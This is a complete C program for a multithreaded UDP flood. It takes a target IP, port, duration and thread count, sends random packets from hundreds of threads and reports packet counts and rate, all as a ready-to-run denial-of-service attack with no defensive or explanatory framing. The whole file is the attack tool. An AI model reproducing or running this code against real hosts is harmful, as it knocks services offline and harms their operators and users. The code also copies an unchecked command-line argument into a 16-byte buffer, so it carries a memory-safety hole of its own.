#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <sys/socket.h>

#define PACKET_SIZE 1024

int keep_running = 1;
char target_ip[16];
int target_port = 80;
int attack_duration = 60;
unsigned long long packets_sent = 0;

void* udp_flood(void* arg) {
    int sock;
    struct sockaddr_in server_addr;
    char packet[PACKET_SIZE];
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) return NULL;
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(target_port);
    server_addr.sin_addr.s_addr = inet_addr(target_ip);
    
    for (int i = 0; i < PACKET_SIZE; i++) {
        packet[i] = rand() % 256;
    }
    
    time_t end_time = time(NULL) + attack_duration;
    
    while (keep_running && time(NULL) < end_time) {
        sendto(sock, packet, PACKET_SIZE, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        packets_sent++;
    }
    
    close(sock);
    return NULL;
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Usage: %s <IP> <PORT> <TIME> [THREADS]\n", argv[0]);
        printf("Example: %s 1.1.1.1 80 60 500\n", argv[0]);
        return 1;
    }
    
    strcpy(target_ip, argv[1]);
    target_port = atoi(argv[2]);
    attack_duration = atoi(argv[3]);
    int thread_count = (argc >= 5) ? atoi(argv[4]) : 500;
    
    printf("[+] Target: %s:%d\n", target_ip, target_port);
    printf("[+] Duration: %d seconds\n", attack_duration);
    printf("[+] Threads: %d\n", thread_count);
    printf("[*] Attack starting...\n");
    
    time_t start_time = time(NULL);
    
    pthread_t threads[thread_count];
    for (int i = 0; i < thread_count; i++) {
        pthread_create(&threads[i], NULL, udp_flood, NULL);
    }
    
    sleep(attack_duration);
    keep_running = 0;
    
    for (int i = 0; i < thread_count; i++) {
        pthread_join(threads[i], NULL);
    }
    
    int elapsed = time(NULL) - start_time;
    printf("\n[+] Attack completed!\n");
    printf("[+] Duration: %d seconds\n", elapsed);
    printf("[+] Packets sent: %llu\n", packets_sent);
    printf("[+] Average PPS: %llu\n", packets_sent / elapsed);
    
    return 0;
}